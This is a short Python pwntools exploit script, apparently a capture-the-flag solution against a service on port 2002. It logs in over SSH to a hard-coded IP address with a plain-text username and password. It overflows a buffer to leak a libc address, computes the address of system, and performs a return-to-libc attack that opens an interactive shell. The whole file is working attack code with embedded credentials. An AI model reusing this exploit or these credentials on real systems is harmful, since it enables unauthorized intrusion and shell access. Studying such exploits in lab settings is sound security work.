from pwn import *

# bufAddr = 0xffffd40b
# retAddr = 0xffffd47c
s = ssh(host='118.70.186.203', port=1017, user='sshuser', password='bkisbse123')

def leak():
    r = s.process('nc localhost 2002'.split(' '))
    r.recvuntil('Give me the size:')
    r.sendline('-1')
    r.recvuntil('Give me the buffer:')
    r.send('a'*113)
    r.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    addr = r.recv(4)
    r.close()
    return u32(addr)
    
    
def exploit(leakedAddr):
    lib = ELF('libc.so.6')
    print "%x" % leakedAddr
    lib.address = leakedAddr - (lib.symbols['__libc_start_main']+247)
    print "%x" % lib.address
    print "systemaddr: %x" % lib.symbols['system']
    r = s.process("nc localhost 2002".split(' '))
    r.sendline('-1')
    r.send('a'*113+p32(lib.symbols['system'])+'AAAA'+p32(lib.search('sh\x00').next()))
    r.interactive()

leakedAddr = leak()
print leakedAddr
exploit(leakedAddr)







